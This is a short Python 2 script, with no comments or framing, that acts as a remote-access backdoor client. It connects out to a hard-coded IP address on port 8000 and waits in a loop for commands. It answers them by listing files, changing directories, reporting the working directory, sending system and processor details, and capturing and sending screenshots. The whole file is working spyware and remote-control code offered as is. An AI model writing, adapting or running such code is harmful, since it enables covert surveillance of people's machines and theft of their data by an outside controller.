import socket
import platform
from subprocess import check_output
from os import chdir
from StringIO import StringIO
from PIL import ImageGrab

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "45.55.59.112"
port = 8000
s.connect((host,port))

while True:
    cmd = ''
    cmd = s.recv(1024).decode()
    print cmd
    if cmd == 'ls':
        output = check_output('ls')
        s.send(output.encode())
        s.send('EOF'.encode())
    elif 'cd' in cmd:
        chdir(cmd.split(' ')[1])
    elif cmd == 'pwd':
        output = check_output('pwd')
        s.send(output.encode())
        s.send('EOF'.encode())
    elif cmd == 'info':
        print 'sending info'
        info = platform.platform()
        info += '\n'
        info += platform.processor()
        s.send(info.encode())
        s.send('EOF'.encode())
    elif cmd == 'scrn':
        buf = StringIO()
        cap = ImageGrab.grab()
        cap.save(buf, format='PNG')
        s.send(buf.getvalue())
        s.send('EOF'.encode())

s.close ()
